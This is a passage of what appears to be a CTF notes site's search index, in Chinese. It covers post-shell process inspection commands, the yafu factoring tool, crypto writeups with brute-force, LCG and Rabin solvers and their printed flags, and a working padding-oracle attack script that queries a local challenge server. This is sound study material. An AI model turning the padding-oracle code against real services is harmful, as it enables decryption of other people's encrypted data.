\u4e2d\u53ef\u80fd\u5305\u542b\u4e86\u6267\u884c\u8fc7\u7684\u5386\u53f2\u8bb0\u5f55\uff0c\u4ece\u547d\u4ee4\u6211\u4eec\u53ef\u4ee5\u63a8\u6d4b\u51fa\u9898\u4eba\u4e4b\u524d\u5728\u8fd9\u5e72\u4e86\u4ec0\u4e48\u3002</p> <p>\u4f8b\u5982\uff0c\u6211\u5728\u4f7f\u7528 zsh \u4e4b\u524d\u53ea\u662f\u4f7f\u7528 bash \u5b89\u88c5\u4e86 zsh \u800c\u5df2\uff1a</p> <p></p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_5","title":"\u4ece\u5f53\u524d\u6587\u4ef6\u627e\u7ebf\u7d22","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_6","title":"\u67e5\u770b\u5f53\u524d\u8def\u5f84","text":"<p>\u53ef\u4ee5\u4f7f\u7528 <code>pwd</code> <code>ls</code> <code>ls -a</code> \u7b49\u67e5\u770b\u5f53\u524d\u8def\u5f84\u53ca\u6587\u4ef6\u3002</p> <p></p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_7","title":"\u5c31\u8fd1\u67e5\u770b\u6587\u4ef6\u5bfb\u627e\u6709\u7528\u4fe1\u606f","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_8","title":"\u67e5\u770b\u5bf9\u5e94\u7684\u6587\u4ef6","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/what_to_do_after_get_shell/#_9","title":"\u5176\u4ed6","text":"<p>\u5176\u4ed6\u53ef\u80fd\u5b58\u5728\u4fe1\u606f\uff0c\u4f46\u662f\u4e0d\u90a3\u4e48\u5e38\u89c1\u7684\u5185\u5bb9\uff0c\u5305\u62ec\u5f53\u524d shell \u6240\u5728\u670d\u52a1\u5668/\u7cfb\u7edf\u7684\u4fe1\u606f\uff0c\u8fd0\u884c\u8fc7\u7684\u8fdb\u7a0b\u7b49\u7b49\u2026\u2026</p> <p>\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u547d\u4ee4\u884c\u5de5\u5177\u6765\u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u7528\u7684\u547d\u4ee4\uff1a</p> <ol> <li><code>ps</code>\u00a0\u547d\u4ee4\uff1a<ul> <li>\u7528\u4e8e\u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7684\u8fdb\u7a0b\u3002</li> <li>\u793a\u4f8b\uff1a<code>ps aux</code>\u00a0\u663e\u793a\u6240\u6709\u7528\u6237\u7684\u6240\u6709\u8fdb\u7a0b\u3002</li> <li>\u793a\u4f8b\uff1a<code>ps -ef</code>\u00a0\u4ee5\u5b8c\u6574\u683c\u5f0f\u663e\u793a\u8fdb\u7a0b\u3002</li> </ul> </li> <li><code>top</code>\u00a0\u547d\u4ee4\uff1a<ul> <li>\u5b9e\u65f6\u663e\u793a\u7cfb\u7edf\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u5e76\u63d0\u4f9b CPU \u548c\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\u3002</li> <li>\u53ea\u9700\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165\u00a0<code>top</code>\uff0c\u7136\u540e\u6309\u00a0<code>q</code>\u00a0\u9000\u51fa\u3002</li> </ul> </li> <li><code>htop</code>\u00a0\u547d\u4ee4\uff1a<ul> <li>\u7c7b\u4f3c\u4e8e\u00a0<code>top</code>\uff0c\u4f46\u63d0\u4f9b\u4e86\u66f4\u53cb\u597d\u7684\u7528\u6237\u754c\u9762\u548c\u66f4\u591a\u529f\u80fd\uff08\u5982\u53ef\u89c6\u5316\uff09\u3002</li> <li>\u5982\u679c\u6ca1\u6709\u5b89\u88c5\uff0c\u53ef\u4ee5\u901a\u8fc7\u00a0<code>sudo apt install htop</code>\u00a0\u6216\u00a0<code>sudo yum install htop</code>\u00a0\u5b89\u88c5\u3002</li> </ul> </li> <li><code>pgrep</code>\u00a0\u547d\u4ee4\uff1a<ul> <li>\u6839\u636e\u540d\u79f0\u67e5\u627e\u8fdb\u7a0b ID\uff08PID\uff09\u3002</li> <li>\u793a\u4f8b\uff1a<code>pgrep python</code>\u00a0\u67e5\u627e\u6240\u6709 Python \u8fdb\u7a0b\u7684 PID\u3002</li> </ul> </li> <li><code>pidof</code>\u00a0\u547d\u4ee4\uff1a  <ul> <li>\u7528\u4e8e\u67e5\u627e\u7279\u5b9a\u7a0b\u5e8f\u7684 PID\u3002</li> <li>\u793a\u4f8b\uff1a<code>pidof bash</code></li> </ul> </li> <li><code>pstree</code>\u00a0\u547d\u4ee4\uff1a<ul> <li>\u4ee5\u6811\u5f62\u7ed3\u6784\u663e\u793a\u8fdb\u7a0b\u53ca\u5176\u5b50\u8fdb\u7a0b\u3002</li> <li>\u793a\u4f8b\uff1a<code>pstree</code></li> </ul> </li> <li><code>lsof</code>\u00a0\u547d\u4ee4\uff1a<ul> <li>\u5217\u51fa\u6253\u5f00\u7684\u6587\u4ef6\u53ca\u5176\u76f8\u5173\u8054\u7684\u8fdb\u7a0b\u3002</li> <li>\u793a\u4f8b\uff1a<code>lsof | grep &lt;filename&gt;</code>\u00a0\u67e5\u627e\u7279\u5b9a\u6587\u4ef6\u7684\u76f8\u5173\u8fdb\u7a0b\u3002</li> </ul> </li> <li><code>/proc/\u76ee\u5f55\u7ed3\u6784\uff1a</code><ul> <li><code>/proc/&lt;PID&gt;/status</code>: \u67e5\u770b\u7279\u5b9a\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002</li> <li><code>/proc/&lt;PID&gt;/cmdline</code>: \u67e5\u770b\u542f\u52a8\u8be5\u8fdb\u7a0b\u65f6\u4f7f\u7528\u7684\u547d\u4ee4\u884c\u53c2\u6570\u3002</li> </ul> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/yafu/","title":"Yafu","text":"<p>\u5e73\u65f6\u5206\u89e3\u5927\u56e0\u6570\u90fd\u7528\u7684\u662f facotrdb \u4f46\u662f\u65ad\u7f51\u6bd4\u8d5b\u548b\u529e\uff1f\u770b\u5411\u4e86 yafu \u3002</p> <p>Quote</p> <p>YAFU (with assistance from other free software) uses the most powerful modern algorithms (and implementations of them) to factor input integers in a  completely automated way.  The automation within YAFU is state-of-the-art,  combining factorization algorithms in an intelligent and adaptive methodology  that minimizes the time to find the factors of arbitrary input integers.   It is most optimized for general inputs up to 160 digits in size, although  there is support for inputs much larger than that, if they have a special  form.  There are also specialized functions for handling  lists of inputs and  ranges of contiguous smaller inputs.</p> <p>\u8bb0\u5f55\u4e0b\u57fa\u672c\u7684\u4f7f\u7528\uff1a</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/yafu/#_1","title":"\u83b7\u53d6","text":"<p>\u9996\u5148\u4ece github \u62c9\u53d6\u6e90\u4ee3\u7801\uff0c\u6216\u8005\u4ece sourceforge \u4e0b\u8f7d\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/other/yafu/#_2","title":"\u57fa\u672c\u4f7f\u7528","text":"<p>\u5728 windows \u4e2d\u8fdb\u5165\u5230\u5bf9\u5e94\u6587\u4ef6\u5939\u4e0b\uff0c\u4f7f\u7528 powershell<sup>1</sup> \u6253\u5f00\u3002</p> <p>\u952e\u5165\uff1a</p> <pre><code># \u5206\u89e3\u8f83\u5c0f\u7684\u6570\n.\\yafu-x64.exe \"factor(&lt;little number&gt;)\"\n# \u5206\u89e3\u8f83\u5927\u7684\u6570\n.\\yafu-x64.exe \"factor(@)\" -batchfile to_be_factor.txt\n</code></pre> <p>\u6211\u4f7f\u7528\u7684\u662f git clone \u4e0b\u6765\u7684\u6e90\u4ee3\u7801\u3002\u4f7f\u7528\u7b2c\u4e8c\u6761\u547d\u4ee4\u65f6\uff0c\u5927\u6574\u6570\uff0c\u653e\u5728\u6587\u4ef6\u4e2d\uff0c\u672b\u5c3e\u591a\u6362\u4e24\u4e2a\u884c\uff0c\u4e0d\u7136\u4f3c\u4e4e\u4f1a\u6709\u95ee\u9898\uff1b\u800c\u4e14\u4f3c\u4e4e\u8fd9\u6837\u505a\u4e5f\u4f1a\u5bfc\u81f4\u6587\u672c\u88ab\u541e\u4e86??\uff1f\u6709\u70b9\u5947\u602a\u3002</p> <p></p> <ol> <li> <p>powershell \u652f\u6301\u90e8\u5206 linux \u547d\u4ee4\uff0c\u4e2a\u4eba\u66f4\u52a0\u719f\u6089\uff0ccmd \u4e5f\u662f\u4e00\u6837\u7684\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/","title":"ZJS-DASCTF2024","text":"","tags":["ctf"]},{"location":"CTF/ZJS-DASCTF2024/#_1","title":"\u6982\u8ff0","text":"<p>\u7b2c\u4e03\u5c4a\u6d59\u6c5f\u7701\u5927\u5b66\u751f\u7f51\u7edc\u4e0e\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b \u9884\u8d5b\uff0b\u51b3\u8d5b\uff0c\u4e2a\u4eba\u5c31\u6478\u51fa\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u7206\u7834\u9898\uff0c\u961f\u53cb\u5b8c\u6210\u5360\u5927\u5934\u3002</p> <p>\u6bd4\u8d5b\u65ad\u7f51\uff0c\u5f88\u591a\u4e1c\u897f\u4e0d\u77e5\u9053\u5c31\u538b\u6839\u505a\u4e0d\u4e86\u4e86\u3002\u8fd8\u6709\u662f\u4e00\u4e9b\u6bd4\u8f83\u9057\u61be\u7684\u5185\u5bb9\uff08\u4f8b\u5982\u539f\u9898\u505a\u8fc7\uff0c\u4f46\u662f\u6bd4\u8d5b\u7684\u65f6\u5019\u90fd\u6ca1\u770b\uff09\uff1bsage math \u4f7f\u7528\u4e0d\u719f\u6089\u5bfc\u81f4\u6d6a\u8d39\u8bb8\u591a\u65f6\u95f4\u3002</p> ZJS-DASCTF2024          <ul> <li> crypto  335  206  4 mins              1739718485 </li> </ul>","tags":["ctf"]},{"location":"CTF/ZJS-DASCTF2024/#_2","title":"\u5176\u4ed6\u53c2\u8003\u9898\u89e3","text":"<ul> <li>\u961f\u53cb cyrus \u7684\u9898\u89e3</li> <li>\u7b2c\u4e03\u5c4a\u6d59\u6c5f\u7701\u5927\u5b66\u751f\u7f51\u7edc\u4e0e\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u9884\u8d5b-WP</li> <li>\u7b2c\u4e03\u5c4a\u6d59\u6c5f\u7701\u5927\u5b66\u751f\u7f51\u7edc\u4e0e\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u51b3\u8d5b Wirteup By 0RAYS</li> </ul>","tags":["ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/","title":"crypto","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/#mycode","title":"Mycode","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/#_1","title":"\u9644\u4ef6","text":"<pre><code>import numpy as np\n\ndef substitute(state, sub_box):\n    return [sub_box[b &amp; 0xF] | (sub_box[(b &gt;&gt; 4) &amp; 0xF] &lt;&lt; 4) for b in state]\n\ndef generate_round_keys(base_key, rounds):\n    round_keys = []\n    temp_key = base_key\n    for _ in range(rounds):\n        round_keys.append(temp_key &amp; 0xFFFFFFFF)\n        temp_key ^= ((temp_key &lt;&lt; 1) &amp; 0xFFFFFFFF) | ((temp_key &gt;&gt; 31) &amp; 0x1)\n    return round_keys\n\ndef process_state(base_key, state, rounds, encrypt):\n    sub_box = [0x9, 0x4, 0xA, 0xB, 0xD, 0x1, 0x8, 0x5, 0x6, 0x2, 0x0, 0x3, 0xC, 0xE, 0xF, 0x7]\n    inv_sub_box = [0xA, 0x5, 0x9, 0xB, 0x1, 0x7, 0x8, 0xF, 0x6, 0x0, 0x2, 0x3, 0xC, 0x4, 0xD, 0xE]\n\n    round_keys = generate_round_keys(base_key, rounds)\n\n    if encrypt:\n        for round in range(rounds):\n            state = substitute(state, sub_box)\n            state = [s ^ ((round_keys[round] &gt;&gt; (i * 8)) &amp; 0xFF) for i, s in enumerate(state)]\n    else:\n        for round in range(rounds - 1, -1, -1):\n            state = [s ^ ((round_keys[round] &gt;&gt; (i * 8)) &amp; 0xFF) for i, s in enumerate(state)]\n            state = substitute(state, inv_sub_box)\n\n    return state\n\ndef encrypt(plaintext, key, rounds=10):\n    length = len(plaintext)\n    padded_length = length if length % 4 == 0 else length + (4 - (length % 4))\n    plaintext += b'\\x00' * (padded_length - length)\n\n    ciphertext = bytearray(padded_length)\n    for i in range(0, padded_length, 4):\n        state = list(plaintext[i:i+4])\n        state = process_state(key, state, rounds, True)\n        ciphertext[i:i+4] = state\n\n    return ciphertext\n\ndef decrypt(ciphertext, key, rounds=10):\n    length = len(ciphertext)\n    plaintext = bytearray(length)\n    for i in range(0, length, 4):\n        state = list(ciphertext[i:i+4])\n        state = process_state(key, state, rounds, False)\n        plaintext[i:i+4] = state\n\n    return plaintext.rstrip(b'\\x00')\n\ndef main():\n    plaintext = b\"DASCTF{******}\"\n    # key = 0xECB... # 4 bytes\n    ciphertext = encrypt(plaintext, key)\n    print(\"Ciphertext:\", \"\".join(f\"{b:02X}\" for b in ciphertext))\n\n\nif __name__ == \"__main__\":\n    main()\n# Ciphertext: A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/#_2","title":"\u9898\u89e3","text":"<p>\u663e\u7136\uff0c\u5bc6\u94a5\u4e00\u90e8\u5206\u90fd\u544a\u8bc9\u6211\u4eec\u4e86\uff0c\u7a77\u4e3e Key \u7206\u7834\uff1a</p> <pre><code>ciphertext = \"A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401\"\nknown_key = \"ECB\"\nfor c1 in \"0123456789ABCDEF\":\n    for c2 in \"0123456789ABCDEF\":\n        for c3 in \"0123456789ABCDEF\":\n            for c4 in \"0123456789ABCDEF\":\n                for c5 in \"0123456789ABCDEF\":\n                    key = int(\n                        (known_key + c1 + c2 + c3 + c4 + c5).encode().hex(), base=16\n                    )\n                    print(\n                        \"key:\",\n                        key,\n                        type(key),\n                    )\n                    pt = decrypt(ciphertext.encode(), key, rounds=10)\n                    try:\n                        print(pt)\n                        if b\"DAS\" in pt:\n                            exit()\n                    except error as e:\n                        print(e)\n</code></pre> <p>\u5f53\u7136\uff0c\u4e0a\u9762\u90a3\u6837\u5199\u6bd4\u8f83\u4e11\u964b\uff0c\u6211\u4eec\u53ef\u4ee5\uff1a</p> <pre><code>from itertools import product\nciphertext = \"A6B343D2C6BE1B268C3EA4744E3AA9914E29A0789F299022820299248C23D678442A902B4C24A8784A3EA401\"\nknown_key = \"ECB\"\nhex_chars = \"0123456789ABCDEF\"\nfor c1, c2, c3, c4, c5 in product(hex_chars, repeat=5):\n    key = int((known_key + c1 + c2 + c3 + c4 + c5).encode().hex(), base=16)\n    pt = decrypt(ciphertext.encode(), key, rounds=10)\n    print(pt)\n    if b\"DAS\" in pt:\n        exit()\n</code></pre> <p>\u7206\u7834\u65f6\u95f4\u6709\u70b9\u4e45\uff0c<code>Key = 0xecb4f678</code></p> <p>Flag</p> <p>DASCTF{6ef4d8e1-845a-4e3c-a4e1-a15e5530a0f4}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/#dlcgh_r","title":"DlcgH_r","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/#_3","title":"\u9644\u4ef6","text":"<pre><code>from Crypto.Util.number import *\nfrom gmpy2 import *\n\nflag = b\"DASCTF{******}\"\n\n\ndef iterate_function(seed, coeff_a, coeff_b, prime_modulus):\n    return (coeff_a * seed + coeff_b) % prime_modulus\n\n\ndef iterate_multiple_times(seed, num_iterations, coeff_a, coeff_b, prime_modulus):\n    for _ in range(num_iterations):\n        seed = iterate_function(seed, coeff_a, coeff_b, prime_modulus)\n    return seed\n\n\np = getPrime(600)\na = getPrime(512)\nb = getPrime(512)\ns = getPrime(512)\nk = getPrime(512)\nt = getPrime(512)\n\nA = iterate_multiple_times(s, k, a, b, p)\nB = iterate_multiple_times(s, t, a, b, p)\n# A B seed \u76f8\u540c\uff0c\u4e0d\u540c\u7684\u53ea\u662f\u8f6e\u6570\nprint(\"p =\", p)\nprint(\"a =\", a)\nprint(\"b =\", b)\nprint(\"s =\", s)\nprint(\"A =\", A)\nprint(\"B =\", B)\n# \u53ea\u6709 k t \u6ca1\u544a\u8bc9\u6211\u4eec\nsecret1 = iterate_multiple_times(A, k, a, b, p)\nsecret2 = iterate_multiple_times(B, t, a, b, p)\n\nassert secret1 == secret2\n\"\"\"\np = 2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479\na = 7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711\nb = 8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157\ns = 9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867\nA = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080\nB = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080\n\"\"\"\n\np2 = next_prime(secret1)\nq2 = getPrime(600)\nn2 = p2 * q2\ne = 4\nm = bytes_to_long(flag)\nc = pow(m, e, n2)\nprint(\"n2 =\", n2)\nprint(\"c =\", c)\n\n\"\"\"\nn2 = 3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749\nc = 1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411\n\"\"\"\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/#_4","title":"\u9898\u89e3","text":"<p>\u9898\u76ee\u63d0\u793a\u8bf4\u5bc6\u94a5\u4ea4\u6362\uff0c\u9664\u4e86\u6700\u540e secret \u662f\u4e00\u6837\u7684\uff0c\u6ca1\u770b\u51fa\u6765\u4ea4\u6362\u4e86\u4ec0\u4e48\u3002</p> <p>\u6bd4\u8d5b\u65f6\u5e94\u8be5\u662f\u975e\u9884\u671f\u89e3\uff1f\u53d1\u73b0 <code>A==B</code> <code>secret1==secret2</code> \uff0c\u731c\u6d4b k t \u5728 lcg \u4e2d\u6a21\u5176\u5468\u671f\u540e\u76f8\u540c\uff0c\u5c1d\u8bd5\u7206\u7834\uff1a</p> find_k<pre><code>p = 2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479\na = 7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711\nb = 8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157\ns = 9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867\nA = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080\nB = 434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080\n\n\ndef iterate_function(seed, coeff_a, coeff_b, prime_modulus):\n    return (coeff_a * seed + coeff_b) % prime_modulus\n\n\ndef iterate_multiple_times(seed, num_iterations, coeff_a, coeff_b, prime_modulus):\n    for _ in range(num_iterations):\n        seed = iterate_function(seed, coeff_a, coeff_b, prime_modulus)\n    return seed\n\n\nsi = s\nwith open(\"i.out\", \"a\") as i_out:\n    for i in range(p):\n        si = iterate_function(si, a, b, p)\n        if si == A:\n            print(si)\n            print(f\"{i+1} is right\")\n            break\n        if i % 1000000 == 0:\n            print(f\"testing {i} times\")\n# 12345\n</code></pre> <p>\u679c\u771f\u53d1\u73b0\u4e86 <code>k = 12345</code>\uff0c\u8fdb\u800c\u5206\u89e3\u4e86 n\uff1b</p> <pre><code>secret2 = iterate_multiple_times(A, 12345, a, b, p)\n</code></pre> <p>\u4f46\u662f\u5f53\u65f6\u5361\u5728 e = 4 \uff0c\u4e0d\u4f1a\u6c42\u89e3\uff1b\u5fd8\u8bb0\u4e86 sage \u4e2d\u5185\u7f6e\u4e86\u5206\u89e3\u65b9\u6cd5\uff0crabin \u7b97\u6cd5\u4e5f\u4e0d\u8bb0\u5f97\u4e86\u624b\u52a8\u5b9e\u73b0\uff0c\u9057\u61be\u672a\u89e3\uff1b\u751a\u81f3\u5fd8\u8bb0\u4e86\u53ef\u4ee5\u7528\u591a\u9879\u5f0f\u6c42\u89e3\u6839\u2026\u2026</p> <p>\u5f53\u7136\uff0c\u5982\u679c\u4e0d\u731c k \uff0c\u548b\u529e\uff1f</p> <p>\u7531\u4e8e lcg \u7684\u751f\u6210\u56fa\u5b9a\u6027\uff0c\u5728\u7b2c\u4e00\u6b21\u6709\uff1a</p> <p>\\(a(\\dots a(a*s_{0}+b)+\\dots)+b = A = s_{0}*a^k + b(a^{k-1}+\\dots+a+1) = s_{0}* a^k + \\frac{b}{a-1}(a^k-1)\\)\uff0c\u4e0d\u96be\u53d1\u73b0 k=0 \u65f6\u4f9d\u65e7\u6210\u7acb\uff0c\u6545\u6709 \\(s_{k}=\\left( s_{0}+ \\frac{b}{a-1} \\right)*a^k- \\frac{b}{a-1}\\) \u3002</p> <p>\u672a\u77e5\u91cf\u53ea\u6709 \\(a^k\\) \u4e86\uff0c\u89e3\u65b9\u7a0b\u6709 \\(k = \\frac{A(a-1)+b}{(a-1)s_{0}+b} \\pmod{p}\\)</p> <pre><code>k = (A*(a-1)+b)/((a-1)*s+b)%p\nassert (s*k+(k-1)/(a-1)*b)%p == A\nsecret1 = (A*k+(k-1)/(a-1)*b)%p\n</code></pre> <p>\u8f93\u51fa\u540e\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u91cc\u7684 k \u5e76\u4e0d\u7b49\u4e8e 12345\uff0c\u4f46\u662f\u5b83\u4eec\u4ea7\u751f\u7684 secret \u662f\u4e00\u81f4\u7684\u3002</p> <pre><code>from sage.all import *\nfrom Crypto.Util.number import long_to_bytes\nfrom gmpy2 import *\ne = 4\nn2 = 3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749\nc = 1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411\nsecret = 1472490340321845700492870656866629756386520746748019952980831685935628618084832981576756885932019702470337632472478610542460495595381421112792242654382213433012352298291319463142353\np = next_prime(secret)\nassert n2 % p == 0\nq = n2//p\nassert q * p == n2\n\nx_s = Mod(c, p).nth_root(e, all=True)\ny_s = Mod(c, q).nth_root(e, all=True)\nfor x in x_s:\n    for y in y_s:\n        m = crt([int(x), int(y)], [p, q])\n        print(long_to_bytes(m)) \n        # b'DASCTF{450a759e-1c7d-4b97-a9de-78b31eff42a9}'\n</code></pre> <p>Flag</p> <p>DASCTF{450a759e-1c7d-4b97-a9de-78b31eff42a9}</p>","tags":["notes","ctf"]},{"location":"CTF/ZJS-DASCTF2024/crypto/#apt","title":"APT","text":"<p>\u7b2c\u4e03\u5c4a\u6d59\u6c5f\u7701\u5927\u5b66\u751f\u7f51\u7edc\u4e0e\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u51b3\u8d5b Wirteup By 0RAYS</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/","title":"ZJUCTF2024","text":"ZJUCTF2024          <ul> <li> CRYPTO  198  229  4 mins              1739718485 </li> <li> MISC  515  290  5 mins              1739718485 </li> <li> REVERSE  42  103  1 mins              1739718485 </li> <li> WEB  29  15  0 mins              1739718485 </li> <li> WELCOME  64  0 mins              1739718485 </li> </ul> <p>\u7b2c\u4e00\u6b21\u6821\u8d5b\uff0c\u81ea\u5df1\u672c\u6765\u60f3\u73a9\u7684\u4e24\u4e2a\u65b9\u5411\u90fd\u90fd\u6bd4\u8f83\u96be\u7ef7\uff0c\u7b97\u4e86\u7b97\u4e86\u3002</p> <p></p> <p>\u6bcf\u9898\u76f4\u7ebf\u7ebf\u4e0b\u65b9\u8868\u793a\u8d5b\u540e\u590d\u76d8\u5185\u5bb9\u3002</p>","tags":["ctf"]},{"location":"CTF/ZJUCTF2024/#_1","title":"\u9898\u89e3\u6536\u96c6","text":"<ul> <li>gopoux writeup</li> <li>PEP672 Silence Pseudo Line</li> <li>\u7b49\u98ce-Writeup</li> </ul>","tags":["ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/","title":"CRYPTO","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#easy_pad","title":"easy_pad","text":"<p>\u7ecf\u5178\u7684 padding oracle attack\uff0c\u8be6\u89c1</p> paddint_oracle.py<pre><code>def padding_oracle_attack(encrypt_msg):\nIV = encrypt_msg[:16]\nciphertext = encrypt_msg[16:]\nblock_size = 16\nblocks = [\n    ciphertext[i : i + block_size] for i in range(0, len(ciphertext), block_size)\n]\nfull_plaintext = b\"\"\n\nfor block_index in range(len(blocks)):\n    if block_index == 0:\n        attack_IV = bytearray(IV)\n    else:\n        attack_IV = bytearray(blocks[block_index - 1])\n\n    current_block = blocks[block_index]\n    plaintext = bytearray(16)\n    for byte_index in range(block_size - 1, -1, -1):\n        padding_value = block_size - byte_index\n\n        for i in range(block_size - 1, byte_index, -1):\n            attack_IV[i] = IV[i] ^ plaintext[i] ^ padding_value\n        # the char set of plaintext\n        plaintext_set = b\"0123456789abcdef\"\n        for pf in plaintext_set:\n            attack_IV[byte_index] = IV[byte_index] ^ pf ^ padding_value\n            attack_cipher = attack_IV + current_block\n            if padding_decide(attack_cipher):\n                plaintext[byte_index] = pf\n                print(\"plaintext: \", plaintext)\n                break\n    IV = current_block\n    full_plaintext += plaintext\nreturn full_plaintext\n</code></pre> <p>\u4ea4\u4e92\u811a\u672c\uff1a</p> easy_pad_solver.py<pre><code>from pwn import *\nfrom Crypto.Util.Padding import pad, unpad\nfrom padding_oracle import padding_oracle_attack\n\n# \u63d0\u4ea4message\ndef handOutMsg(message):\n    print(\"hand out ing .............\")\n    con.sendafter(b\"Quit\", b\"2\\n\")\n    con.sendafter(b\"Give me message\", message.encode() + b\"\\n\")\n\n# padding\ndef sendAttackCiphertext(attack_ciphertext):\n    # \u5c06attack_ciphertext \u7531 bytearray \u8f6c\u4e3a\u53ef\u53d1\u9001\u7684\u6570\u636e\u7c7b\u578b\n    attack_ciphertext = attack_ciphertext.hex().encode()\n    try:\n        con.sendafter(b\"2. Quit\", b\"1\\n\")\n        con.sendafter(b\"Give me ciphertext\", attack_ciphertext + b\"\\n\")\n        respon = con.recvuntil(b\"1. Decrypt\").decode()\n        return respon\n    except EOFError:\n        print(\"Connection closed unexpectedly\")\n        return None\n\n# padding valid decide\ndef padding_decide(attack_ciphertext):\n    times = 16\n    responses = [sendAttackCiphertext(attack_ciphertext) for _ in range(times)]\n    # \u8d85\u8fc7\u4e00\u534a\u7684\u8fd4\u56de\u503c\u4e3aFalse\uff0c\u5219\u8fd4\u56deTrue\n    if sum(1 for resp in responses if \"False\" in resp) &gt; times / 2:\n        return True\n    elif sum(1 for resp in responses if \"True\" in resp) &gt; times / 2:\n        return False\n    else:\n        raise ValueError(\"padding_decide error\")\n\n\ncontext.log_level = \"debug\"\ncon = connect(\"127.0.0.1\", 61600)\n\nencrypt_msg = con.recvuntil(b\"\\n\")[:-1]  # remove the last '\\n'\nencrypt_msg = bytes.fromhex(encrypt_msg.decode())\nprint(encrypt_msg)\n# exit()\n\nrecovered_bytes = padding_oracle_attack(encrypt_msg)\nprint(\"recovered_bytes\", recovered_bytes)\nrecovered_message = recovered_bytes.decode(\"ascii\")\nprint(\"recovered_message: \", recovered_message)\nhandOutMsg(recovered_message)\n\ncon.recvall(timeout=10)\ncon.close()\n</code></pre>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#fib-i","title":"FIB I","text":"<p>\u8003\u5bdf\u6590\u6ce2\u90a3\u5951\u6570\u5217\u77e5\u8bc6\uff0c\u53c2\u8003 Properties of Fibonacci Numbers &amp; OI-wiki</p> <p>\u4e09\u4e2a\u90e8\u5206\u4f9d\u6b21\u53c2\u8003\uff1a</p>","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#part1","title":"part1","text":"","tags":["notes","ctf"]},{"location":"CTF/ZJUCTF2024/CRYPTO/#part2","title":"part2","text":"<p>\u5c06 k 